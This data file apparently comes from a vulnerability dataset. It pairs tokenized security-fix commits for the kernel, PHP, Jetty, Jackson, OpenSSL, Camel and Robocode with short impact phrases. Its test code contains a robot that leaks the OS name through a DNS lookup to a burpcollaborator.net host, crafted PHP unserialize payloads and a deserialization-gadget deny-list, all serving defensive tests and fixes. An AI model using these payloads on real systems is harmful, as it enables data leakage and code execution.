{"contents": ["crypto:", "aesni", "-", "fix", "memory", "usage", "in", "GCM", "decryption", "The", "kernel", "crypto", "API", "logic", "requires", "the", "caller", "to", "provide", "the", "length", "of", "(ciphertext", "||", "authentication", "tag)", "as", "cryptlen", "for", "the", "AEAD", "decryption", "operation.", "Thus,", "the", "cipher", "implementation", "must", "calculate", "the", "size", "of", "the", "plaintext", "output", "itself", "and", "cannot", "simply", "use", "cryptlen.", "The", "RFC4106", "GCM", "decryption", "operation", "tries", "to", "overwrite", "cryptlen", "memory", "in", "req->dst.", "As", "the", "destination", "buffer", "for", "decryption", "only", "needs", "to", "hold", "the", "plaintext", "memory", "but", "cryptlen", "references", "the", "input", "buffer", "holding", "(ciphertext", "||", "authentication", "tag),", "the", "assumption", "of", "the", "destination", "buffer", "length", "in", "RFC4106", "GCM", "operation", "leads", "to", "a", "too", "large", "size.", "This", "patch", "simply", "uses", "the", "already", "calculated", "plaintext", "size.", "In", "addition,", "this", "patch", "fixes", "the", "offset", "calculation", "of", "the", "AAD", "buffer", "pointer:", "as", "mentioned", "before,", "cryptlen", "already", "includes", "the", "size", "of", "the", "tag.", "Thus,", "the", "tag", "does", "not", "need", "to", "be", "added.", "With", "the", "addition,", "the", "AAD", "will", "be", "written", "beyond", "the", "already", "allocated", "buffer.", "Note,", "this", "fixes", "a", "kernel", "crash", "that", "can", "be", "triggered", "from", "user", "space", "via", "AF_ALG(aead)", "--", "simply", "use", "the", "libkcapi", "test", "application", "from", "[1]", "and", "update", "it", "to", "use", "rfc4106-gcm-aes.", "Using", "[1],", "the", "changes", "were", "tested", "using", "CAVS", "vectors", "to", "demonstrate", "that", "the", "crypto", "operation", "still", "delivers", "the", "right", "results.", "[1]", "http://www.chronox.de/libkcapi.html", "CC:", "Tadeusz", "Struk", "<tadeusz.struk@intel.com>", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Stephan", "Mueller", "<smueller@chronox.de>", "Signed-off-by:", "Herbert", "Xu", "<herbert@gondor.apana.org.au>"], "code_tokens": ["assoc", "=", "(", "src", "+", "req", "-", ">", "cryptlen", ")", ";", "scatterwalk_map_and_copy", "(", "dst", ",", "req", "-", ">", "dst", ",", "0", ",", "tempCipherLen", ",", "1", ")", ";</s>assoc", "=", "(", "src", "+", "req", "-", ">", "cryptlen", "+", "auth_tag_len", ")", ";", "scatterwalk_map_and_copy", "(", "dst", ",", "req", "-", ">", "dst", ",", "0", ",", "req", "-", ">", "cryptlen", ",", "1", ")", ";"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "with", "elevated", "privileges"]}
{"contents": ["More", "fixes", "for", "bug", "#69152"], "code_tokens": ["if", "(", "Z_TYPE_P", "(", "trace", ")", "!", "=", "IS_ARRAY", ")", "{", "RETURN_FALSE", ";", "}", "-", "-", "TEST", "-", "-", "Bug", "#", "69152", ":", "Type", "Confusion", "Infoleak", "Vulnerability", "in", "unserialize", "(", ")", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "x", "=", "unserialize", "(", "'", "O", ":", "9", ":", "\"", "exception", "\"", ":", "1", ":", "{", "s", ":", "16", ":", "\"'", ".\"", "\\", "0", "\"", ".'", "Exception", "'", ".\"", "\\", "0", "\"", ".'", "trace", "\"", ";", "s", ":", "4", ":", "\"", "ryat", "\"", ";}", "')", ";", "echo", "$", "x", ";", "$", "x", "=", "unserialize", "(", "'", "O", ":", "4", ":", "\"", "test", "\"", ":", "1", ":", "{", "s", ":", "27", ":", "\"", "__PHP_Incomplete_Class_Name", "\"", ";", "R", ":", "1", ";", "}'", ");", "$", "x", "-", ">", "test", "(", ");", "?", ">", "-", "-", "EXPECTF", "-", "-", "exception", "'", "Exception", "'", "in", "%", "s", ":", "%", "d", "Stack", "trace", ":", "#", "0", "{", "main", "}", "Fatal", "error", ":", "main", "(", "):", "The", "script", "tried", "to", "execute", "a", "method", "or", "access", "a", "property", "of", "an", "incomplete", "object", ".", "Please", "ensure", "that", "the", "class", "definition", "\"", "unknown", "\"", "of", "the", "object", "you", "are", "trying", "to", "operate", "on", "was", "loaded", "_before_", "unserialize", "(", ")", "gets", "called", "or", "provide", "a", "__autoload", "(", ")", "function", "to", "load", "the", "class", "definition", "in", "%", "s", "on", "line", "%", "d</s>"], "docstring_tokens": ["obtain", "memory", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["net:", "llc:", "use", "correct", "size", "for", "sysctl", "timeout", "entries", "The", "timeout", "entries", "are", "sizeof(int)", "rather", "than", "sizeof(long),", "which", "means", "that", "when", "they", "were", "getting", "read", "we'd", "also", "leak", "kernel", "memory", "to", "userspace", "along", "with", "the", "timeout", "values.", "Signed-off-by:", "Sasha", "Levin", "<sasha.levin@oracle.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": [".", "maxlen", "=", "sizeof", "(", "sysctl_llc2_ack_timeout", ")", ",", ".", "maxlen", "=", "sizeof", "(", "sysctl_llc2_busy_timeout", ")", ",", ".", "maxlen", "=", "sizeof", "(", "sysctl_llc2_p_timeout", ")", ",", ".", "maxlen", "=", "sizeof", "(", "sysctl_llc2_rej_timeout", ")", ",</s>.", "maxlen", "=", "sizeof", "(", "long", ")", ",", ".", "maxlen", "=", "sizeof", "(", "long", ")", ",", ".", "maxlen", "=", "sizeof", "(", "long", ")", ",", ".", "maxlen", "=", "sizeof", "(", "long", ")", ","], "docstring_tokens": ["obtain", "potentially", "sensitive", "information", "from", "kernel", "memory", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["Issue", "#3549", "-", "Using", "FileName", "properly", "in", "Directory", "Listings.", "+", "Even", "though", "this", "was", "reported", "against", "Windows,", "the", "solution", "implemented", "should", "be", "sane", "for", "all", "OS", "or", "FileSystem", "combinations.", "Signed-off-by:", "Joakim", "Erdfelt", "<joakim.erdfelt@gmail.com>"], "code_tokens": ["import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "net", ".", "URLClassLoader", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "/", "/", "The", "name", "of", "the", "odd", "-", "jar", "used", "for", "testing", "\"", "jar", ":", "file", ":", "//", "\"", "based", "resource", "access", ".", "private", "static", "final", "String", "ODD_JAR", "=", "\"", "jar", "-", "resource", "-", "odd", ".", "jar", "\"", ";", "File", "extraJarResources", "=", "MavenTestingUtils", ".", "getTestResourceFile", "(", "ODD_JAR", ")", ";", "URL", "urls", "[", "]", "=", "new", "URL", "[", "]", "{", "extraJarResources", ".", "toURI", "(", ").", "toURL", "(", ")", "}", ";", "ClassLoader", "parentClassLoader", "=", "Thread", ".", "currentThread", "(", ").", "getContextClassLoader", "(", ");", "URLClassLoader", "extraClassLoader", "=", "new", "URLClassLoader", "(", "urls", ",", "parentClassLoader", ")", ";", "context", ".", "setClassLoader", "(", "extraClassLoader", ")", ";", "/", "**", "*", "A", "regression", "on", "windows", "allowed", "the", "directory", "listing", "show", "*", "the", "fully", "qualified", "paths", "within", "the", "directory", "listing", ".", "*", "This", "test", "ensures", "that", "this", "behavior", "will", "not", "arise", "again", ".", "*", "/", "@", "Test", "public", "void", "testListingFilenamesOnly", "(", ")", "throws", "Exception", "{", "ServletHolder", "defholder", "=", "context", ".", "addServlet", "(", "DefaultServlet", ".", "class", ",", "\"", "/*", "\")", ";", "defholder", ".", "setInitParameter", "(", "\"", "dirAllowed", "\"", ",", "\"", "true", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "redirectWelcome", "\"", ",", "\"", "false", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "gzip", "\"", ",", "\"", "false", "\"", ");", "testdir", ".", "ensureEmpty", "(", ");", "/", "*", "create", "some", "content", "in", "the", "docroot", "*", "/", "File", "resBase", "=", "testdir", ".", "getFile", "(", "\"", "docroot", "\"", ");", "FS", ".", "ensureDirExists", "(", "resBase", ")", ";", "File", "one", "=", "new", "File", "(", "resBase", ",", "\"", "one", "\"", ");", "assertTrue", "(", "one", ".", "mkdir", "(", "))", ";", "File", "deep", "=", "new", "File", "(", "one", ",", "\"", "deep", "\"", ");", "assertTrue", "(", "deep", ".", "mkdir", "(", "))", ";", "FS", ".", "touch", "(", "new", "File", "(", "deep", ",", "\"", "foo", "\"", "))", ";", "assertTrue", "(", "new", "File", "(", "resBase", ",", "\"", "two", "\"", ").", "mkdir", "(", "))", ";", "assertTrue", "(", "new", "File", "(", "resBase", ",", "\"", "three", "\"", ").", "mkdir", "(", "))", ";", "String", "resBasePath", "=", "resBase", ".", "getAbsolutePath", "(", ");", "defholder", ".", "setInitParameter", "(", "\"", "resourceBase", "\"", ",", "resBasePath", ")", ";", "StringBuffer", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "one", "/", "deep", "/", "HTTP", "/", "1", ".", "0", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "n", "\"", ");", "String", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"/", "foo", "\"", ",", "response", ")", ";", "assertResponseNotContains", "(", "resBase", ".", "getAbsolutePath", "(", "),", "response", ")", ";", "}", "/", "**", "*", "A", "regression", "on", "windows", "allowed", "the", "directory", "listing", "show", "*", "the", "fully", "qualified", "paths", "within", "the", "directory", "listing", ".", "*", "This", "test", "ensures", "that", "this", "behavior", "will", "not", "arise", "again", ".", "*", "/", "@", "Test", "public", "void", "testListingFilenamesOnly_UrlResource", "(", ")", "throws", "Exception", "{", "URL", "extraResource", "=", "context", ".", "getClassLoader", "(", ").", "getResource", "(", "\"", "rez", "/", "one", "\"", ");", "assertNotNull", "(", "\"", "Must", "have", "extra", "jar", "resource", "in", "classloader", "\"", ",", "extraResource", ")", ";", "String", "extraResourceBaseString", "=", "extraResource", ".", "toURI", "(", ").", "toASCIIString", "(", ");", "extraResourceBaseString", "=", "extraResourceBaseString", ".", "substring", "(", "0", ",", "extraResourceBaseString", ".", "length", "(", ")", "-", "\"", "/", "one", "\"", ".", "length", "(", "))", ";", "ServletHolder", "defholder", "=", "context", ".", "addServlet", "(", "DefaultServlet", ".", "class", ",", "\"", "/", "extra", "/", "*\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "resourceBase", "\"", ",", "extraResourceBaseString", ")", ";", "defholder", ".", "setInitParameter", "(", "\"", "pathInfoOnly", "\"", ",", "\"", "true", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "dirAllowed", "\"", ",", "\"", "true", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "redirectWelcome", "\"", ",", "\"", "false", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "gzip", "\"", ",", "\"", "false", "\"", ");", "StringBuffer", "req1", ";", "String", "response", ";", "/", "/", "Test", "that", "GET", "works", "first", ".", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "one", "HTTP", "/", "1", ".", "0", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"", "is", "this", "the", "one", "?", "\",", "response", ")", ";", "/", "/", "Typical", "directory", "listing", "of", "location", "in", "jar", ":", "file", ":", "//", "URL", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "deep", "/", "HTTP", "/", "1", ".", "0", "\\", "r", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "r", "\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"/", "xxx", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"/", "yyy", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"/", "zzz", "\"", ",", "response", ")", ";", "assertResponseNotContains", "(", "extraResourceBaseString", ",", "response", ")", ";", "assertResponseNotContains", "(", "ODD_JAR", ",", "response", ")", ";", "/", "/", "Get", "deep", "resource", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "deep", "/", "yyy", "HTTP", "/", "1", ".", "0", "\\", "r", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "r", "\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"", "a", "file", "named", "yyy", "\"", ",", "response", ")", ";", "/", "/", "Convoluted", "directory", "listing", "of", "location", "in", "jar", ":", "file", ":", "//", "URL", "/", "/", "This", "exists", "to", "test", "proper", "encoding", "output", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "oddities", "/", "HTTP", "/", "1", ".", "0", "\\", "r", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "r", "\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\">", "#", "hashcode", "&", "nbsp", ";", "<\"", ",", "response", ")", ";", "/", "/", "text", "on", "page", "assertResponseContains", "(", "\"/", "oddities", "/", "%", "23hashcode", "\"", ",", "response", ")", ";", "/", "/", "generated", "link", "assertResponseContains", "(", "\">", "other", "%", "2fkind", "%", "2Fof", "%", "2fslash", "&", "nbsp", ";", "<\"", ",", "response", ")", ";", "/", "/", "text", "on", "page", "assertResponseContains", "(", "\"/", "oddities", "/", "other", "%", "252fkind", "%", "252Fof", "%", "252fslash", "\"", ",", "response", ")", ";", "/", "/", "generated", "link", "assertResponseContains", "(", "\">", "a", "file", "with", "a", "space", "&", "nbsp", ";", "<\"", ",", "response", ")", ";", "/", "/", "text", "on", "page", "assertResponseContains", "(", "\"/", "oddities", "/", "a", "%", "20file", "%", "20with", "%", "20a", "%", "20space", "\"", ",", "response", ")", ";", "/", "/", "generated", "link", "assertResponseNotContains", "(", "extraResourceBaseString", ",", "response", ")", ";", "assertResponseNotContains", "(", "ODD_JAR", ",", "response", ")", ";", "}", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "/", "**", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "/", "public", "static", "Resource", "newResource", "(", "String", "resource", ",", "boolean", "useCaches", ")", "*", "@", "param", "resource", "Resource", "as", "string", "representation", "*", "@", "param", "checkParents", "True", "if", "forced", "searching", "of", "parent", "Classloaders", "is", "performed", "to", "work", "around", "/", "**", "*", "@", "param", "uri", "the", "uri", "to", "encode", "*", "@", "return", "null", "(", "this", "is", "deprecated", ")", "*", "@", "deprecated", "use", "{", "@", "link", "URIUtil", "}", "or", "{", "@", "link", "UrlEncoded", "}", "instead", "*", "@", "throws", "IOException", "if", "unable", "to", "get", "the", "list", "of", "resources", "as", "HTML", "*", "@", "deprecated", "use", "{", "@", "link", "#", "getListHTML", "(", "String", ",", "boolean", ",", "String", ")", "}", "instead", "@", "Deprecated", "String", "name", "=", "item", ".", "getFileName", "(", ");", "if", "(", "StringUtil", ".", "isBlank", "(", "name", ")", ")", "continue", ";", "/", "/", "skip", "long", "lastModified", "=", "item", ".", "lastModified", "(", ");", "if", "(", "lastModified", ">", "0", ")", "{", "buf", ".", "append", "(", "dfmt", ".", "format", "(", "new", "Date", "(", "item", ".", "lastModified", "(", "))", "))", ";", "}", "buf", ".", "append", "(", "\"&", "nbsp", ";", "</", "td", ">", "\")", ";", "long", "length", "=", "item", ".", "length", "(", ");", "if", "(", "length", ">", "=", "0", ")", "{", "buf", ".", "append", "(", "String", ".", "format", "(", "\"%", ",", "d", "bytes", "\"", ",", "item", ".", "length", "(", "))", ");", "}", "buf", ".", "append", "(", "\"&", "nbsp", ";", "</", "td", ">", "</", "tr", ">", "\\", "n", "\"", ");", "/", "**", "*", "Get", "the", "raw", "(", "decoded", "if", "possible", ")", "Filename", "for", "this", "Resource", ".", "*", "This", "is", "the", "last", "segment", "of", "the", "path", ".", "*", "@", "return", "the", "raw", "/", "decoded", "filename", "for", "this", "resource", "*", "/", "private", "String", "getFileName", "(", ")", "{", "try", "{", "/", "/", "if", "a", "Resource", "supports", "File", "File", "file", "=", "getFile", "(", ");", "if", "(", "file", "!", "=", "null", ")", "{", "return", "file", ".", "getName", "(", ");", "}", "}", "catch", "(", "Throwable", "ignore", ")", "{", "}", "/", "/", "All", "others", "use", "raw", "getName", "try", "{", "String", "rawName", "=", "getName", "(", ");", "/", "/", "gets", "long", "name", "\"", "/", "foo", "/", "bar", "/", "xxx", "\"", "int", "idx", "=", "rawName", ".", "lastIndexOf", "(", "'/", "')", ";", "if", "(", "idx", "=", "=", "rawName", ".", "length", "(", ")-", "1", ")", "{", "/", "/", "hit", "a", "tail", "slash", ",", "aka", "a", "name", "for", "a", "directory", "\"", "/", "foo", "/", "bar", "/", "\"", "idx", "=", "rawName", ".", "lastIndexOf", "(", "'/", "',", "idx", "-", "1", ")", ";", "}", "String", "encodedFileName", ";", "if", "(", "idx", ">", "=", "0", ")", "{", "encodedFileName", "=", "rawName", ".", "substring", "(", "idx", "+", "1", ")", ";", "}", "else", "{", "encodedFileName", "=", "rawName", ";", "/", "/", "entire", "name", "}", "return", "UrlEncoded", ".", "decodeString", "(", "encodedFileName", ",", "0", ",", "encodedFileName", ".", "length", "(", "),", "UTF_8", ")", ";", "}", "catch", "(", "Throwable", "ignore", ")", "{", "}", "return", "null", ";", "}", "*", "@", "param", "out", "*", "@", "throws", "MalformedURLException</s>\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "+", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "+", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "+", "/", "**", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "/", "public", "static", "Resource", "newResource", "(", "String", "resource", ",", "boolean", "useCaches", ")", "*", "@", "param", "resource", "Resource", "as", "string", "representation", "*", "@", "param", "checkParents", "True", "if", "forced", "searching", "of", "parent", "Classloaders", "is", "performed", "to", "work", "around", "/", "**", "*", "@", "deprecated", "String", "name", "=", "item", ".", "getName", "(", ");", "int", "slashIdx", "=", "name", ".", "lastIndexOf", "(", "'/", "')", ";", "if", "(", "slashIdx", "!", "=", "-", "1", ")", "name", "=", "name", ".", "substring", "(", "slashIdx", "+", "1", ")", ";", "buf", ".", "append", "(", "dfmt", ".", "format", "(", "new", "Date", "(", "item", ".", "lastModified", "(", "))", "))", ";", "buf", ".", "append", "(", "\"<", "/", "td", ">", "\")", ";", "buf", ".", "append", "(", "String", ".", "format", "(", "\"%", ",", "d", "\"", ",", "item", ".", "length", "(", "))", ");", "buf", ".", "append", "(", "\"", "bytes", "&", "nbsp", ";", "</", "td", ">", "</", "tr", ">", "\\", "n", "\"", ");", "*", "@", "param", "out", "*", "@", "throws", "MalformedURLException"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["Fix", "#2670"], "code_tokens": ["#", "2670", ":", "Block", "one", "more", "gadget", "type", "(", "openjpa", ")", "(", "reported", "by", "XuYuanzhen", ")", "/", "/", "[", "databind", "#", "2186", "]", ",", "[", "databind", "#", "2670", "]", ":", "yet", "more", "3rd", "party", "gadgets", "s", ".", "add", "(", "\"", "org", ".", "apache", ".", "openjpa", ".", "ee", ".", "WASRegistryManagedRuntime", "\"", ");", "/", "/", "[", "#", "2670", "]", "addition</s>/", "/", "[", "databind", "#", "2186", "]", ":", "yet", "more", "3rd", "party", "gadgets"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["splice:", "fix", "bad", "unlock_page()", "in", "error", "case", "If", "add_to_page_cache_lru()", "fails,", "the", "page", "will", "not", "be", "locked.", "But", "splice", "jumps", "to", "an", "error", "path", "that", "does", "a", "page", "release", "and", "unlock,", "causing", "a", "BUG()", "in", "unlock_page().", "Fix", "this", "by", "adding", "one", "more", "label", "that", "just", "releases", "the", "page.", "This", "bug", "was", "actually", "triggered", "on", "EL5", "by", "gurudas", "pai", "<gurudas.pai@oracle.com>", "using", "fio.", "Signed-off-by:", "Jens", "Axboe", "<jens.axboe@oracle.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["goto", "out_release", ";", "out_release", ":", "page_cache_release", "(", "page", ")", ";</s>goto", "out", ";", "page_cache_release", "(", "page", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(kernel", "BUG", "and", "system", "crash)"]}
{"contents": ["CAMEL-13042:", "Polished"], "code_tokens": ["</s>import", "org", ".", "apache", ".", "camel", ".", "CamelExchangeException", ";"], "docstring_tokens": ["view", "arbitrary", "files", "on", "the", "system"]}
{"contents": ["Harden", "ASN.1", "BIO", "handling", "of", "large", "amounts", "of", "data.", "If", "the", "ASN.1", "BIO", "is", "presented", "with", "a", "large", "length", "field", "read", "it", "in", "chunks", "of", "increasing", "size", "checking", "for", "EOF", "on", "each", "read.", "This", "prevents", "small", "files", "allocating", "excessive", "amounts", "of", "data.", "Thanks", "to", "Brian", "Carpenter", "for", "reporting", "this", "issue.", "Reviewed-by:", "Viktor", "Dukhovni", "<viktor@openssl.org>"], "code_tokens": ["#", "define", "ASN1_CHUNK_INITIAL_SIZE", "(", "16", "*", "1024", ")", "size_t", "chunk_max", "=", "ASN1_CHUNK_INITIAL_SIZE", ";", "/", "*", "*", "Read", "content", "in", "chunks", "of", "increasing", "size", "*", "so", "we", "can", "return", "an", "error", "for", "EOF", "without", "*", "having", "to", "allocate", "the", "entire", "content", "length", "*", "in", "one", "go", ".", "*", "/", "size_t", "chunk", "=", "want", ">", "chunk_max", "?", "chunk_max", ":", "want", ";", "if", "(", "!", "BUF_MEM_grow_clean", "(", "b", ",", "len", "+", "chunk", ")", ")", "{", "ASN1err", "(", "ASN1_F_ASN1_D2I_READ_BIO", ",", "ERR_R_MALLOC_FAILURE", ")", ";", "want", "-", "=", "chunk", ";", "while", "(", "chunk", ">", "0", ")", "{", "i", "=", "BIO_read", "(", "in", ",", "&", "(", "b", "-", ">", "data", "[", "len", "]", "),", "chunk", ")", ";", "if", "(", "i", "<", "=", "0", ")", "{", "ASN1err", "(", "ASN1_F_ASN1_D2I_READ_BIO", ",", "ASN1_R_NOT_ENOUGH_DATA", ")", ";", "goto", "err", ";", "}", "len", "+", "=", "i", ";", "chunk", "-", "=", "i", ";", "}", "if", "(", "chunk_max", "<", "INT_MAX", "/", "2", ")", "chunk_max", "*", "=", "2", ";</s>if", "(", "!", "BUF_MEM_grow_clean", "(", "b", ",", "len", "+", "want", ")", ")", "{", "ASN1err", "(", "ASN1_F_ASN1_D2I_READ_BIO", ",", "ERR_R_MALLOC_FAILURE", ")", ";", "goto", "err", ";", "}", "i", "=", "BIO_read", "(", "in", ",", "&", "(", "b", "-", ">", "data", "[", "len", "]", "),", "want", ")", ";", "if", "(", "i", "<", "=", "0", ")", "{", "ASN1err", "(", "ASN1_F_ASN1_D2I_READ_BIO", ",", "ASN1_R_NOT_ENOUGH_DATA", ")", ";", "len", "+", "=", "i", ";", "want", "-", "=", "i", ";"], "docstring_tokens": ["casuse", "allocation", "of", "large", "amounts", "of", "memory", "potentially", "consuming", "excessive", "resources", "or", "exhausting", "memory"]}
{"contents": ["CAMEL-12444:", "Improved", "DTD", "handling", "in", "validator", "component."], "code_tokens": ["LOG", ".", "debug", "(", "\"", "Configuring", "SchemaFactory", "to", "not", "allow", "access", "to", "external", "DTD", "/", "Schema", "\"", ");", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "processor", ".", "validation", ".", "SchemaReader", ".", "ACCESS_EXTERNAL_DTD", ";", "/", "/", "turn", "off", "access", "to", "external", "schema", "by", "default", "if", "(", "!", "Boolean", ".", "parseBoolean", "(", "exchange", ".", "getContext", "(", ").", "getGlobalOptions", "(", ").", "get", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{", "try", "{", "LOG", ".", "debug", "(", "\"", "Configuring", "Validator", "to", "not", "allow", "access", "to", "external", "DTD", "/", "Schema", "\"", ");", "validator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "validator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "\")", ";", "}", "catch", "(", "SAXException", "e", ")", "{", "LOG", ".", "warn", "(", "e", ".", "getMessage", "(", "),", "e", ")", ";", "}", "}</s>"], "docstring_tokens": ["read", "arbitrary", "files"]}
{"contents": ["Bug-406:", "DNS", "interaction", "is", "not", "blocked", "by", "Robocode's", "security", "manager", "+", "test(s)", "to", "verify", "the", "fix"], "code_tokens": ["import", "java", ".", "net", ".", "SocketPermission", ";", "import", "java", ".", "security", ".", "Permission", ";", "throw", "new", "SecurityException", "(", "message", ")", ";", "throw", "new", "SecurityException", "(", "message", ")", ";", "public", "void", "checkPermission", "(", "Permission", "perm", ")", "{", "if", "(", "RobocodeProperties", ".", "isSecurityOff", "(", "))", "{", "return", ";", "}", "Thread", "c", "=", "Thread", ".", "currentThread", "(", ");", "if", "(", "isSafeThread", "(", "c", ")", ")", "{", "return", ";", "}", "super", ".", "checkPermission", "(", "perm", ")", ";", "if", "(", "perm", "instanceof", "SocketPermission", ")", "{", "IHostedThread", "robotProxy", "=", "threadManager", ".", "getLoadedOrLoadingRobotProxy", "(", "c", ")", ";", "String", "message", "=", "\"", "Using", "socket", "is", "not", "allowed", "\"", ";", "robotProxy", ".", "punishSecurityViolation", "(", "message", ")", ";", "throw", "new", "SecurityException", "(", "message", ")", ";", "}", "}", "package", "tested", ".", "robots", ";", "public", "class", "DnsAttack", "extends", "robocode", ".", "Robot", "{", "static", "{", "try", "{", "new", "java", ".", "net", ".", "URL", "(", "\"", "http", ":", "//", "\"", "+", "System", ".", "getProperty", "(", "\"", "os", ".", "name", "\"", ").", "replaceAll", "(", "\"", "\"", ",", "\"", ".\"", ")", "+", "\"", ".", "randomsubdomain", ".", "burpcollaborator", ".", "net", "\"", ").", "openStream", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "}", "}", "public", "void", "run", "(", ")", "{", "for", "(", ";;", ")", "{", "ahead", "(", "100", ")", ";", "back", "(", "100", ")", ";", "}", "}", "}", "@", "@", "-", "19", ",", "7", "+", "19", ",", "7", "@", "@", "private", "boolean", "securityExceptionOccurred", ";", "if", "(", "out", ".", "contains", "(", "\"", "java", ".", "lang", ".", "SecurityException", ":", "\")", ")", "{", "securityExceptionOccurred", "=", "true", ";", "Assert", ".", "assertTrue", "(", "\"", "Socket", "connection", "is", "not", "allowed", "\"", ",", "securityExceptionOccurred", ")", ";", "return", "2", ";", "private", "boolean", "securityExceptionOccurred", ";", "if", "(", "out", ".", "contains", "(", "\"", "java", ".", "lang", ".", "SecurityException", ":", "\")", ")", "{", "securityExceptionOccurred", "=", "true", ";", "Assert", ".", "assertTrue", "(", "\"", "Socket", "connection", "is", "not", "allowed", "\"", ",", "securityExceptionOccurred", ")", ";", "return", "1", ";", "/", "**", "*", "Copyright", "(", "c", ")", "2001", "-", "2019", "Mathew", "A", ".", "Nelson", "and", "Robocode", "contributors", "*", "All", "rights", "reserved", ".", "This", "program", "and", "the", "accompanying", "materials", "*", "are", "made", "available", "under", "the", "terms", "of", "the", "Eclipse", "Public", "License", "v1", ".", "0", "*", "which", "accompanies", "this", "distribution", ",", "and", "is", "available", "at", "*", "https", ":", "//", "robocode", ".", "sourceforge", ".", "io", "/", "license", "/", "epl", "-", "v10", ".", "html", "*", "/", "package", "net", ".", "sf", ".", "robocode", ".", "test", ".", "robots", ";", "import", "net", ".", "sf", ".", "robocode", ".", "test", ".", "helpers", ".", "RobocodeTestBed", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "robocode", ".", "control", ".", "events", ".", "TurnEndedEvent", ";", "/", "**", "*", "@", "author", "Flemming", "N", ".", "Larsen", "(", "original", ")", "*", "/", "public", "class", "TestStaticConstructorDnsAttack", "extends", "RobocodeTestBed", "{", "private", "boolean", "securityExceptionOccurred", ";", "@", "Override", "public", "String", "getRobotNames", "(", ")", "{", "return", "\"", "tested", ".", "robots", ".", "DnsAttack", ",", "sample", ".", "Target", "\"", ";", "}", "@", "Override", "public", "void", "onTurnEnded", "(", "TurnEndedEvent", "event", ")", "{", "super", ".", "onTurnEnded", "(", "event", ")", ";", "final", "String", "out", "=", "event", ".", "getTurnSnapshot", "(", ").", "getRobots", "(", ")[", "0", "]", ".", "getOutputStreamSnapshot", "(", ");", "if", "(", "out", ".", "contains", "(", "\"", "SYSTEM", ":", "Using", "socket", "is", "not", "allowed", "\"", "))", "{", "securityExceptionOccurred", "=", "true", ";", "}", "}", "@", "Override", "protected", "void", "runTeardown", "(", ")", "{", "Assert", ".", "assertTrue", "(", "\"", "Socket", "connection", "is", "not", "allowed", 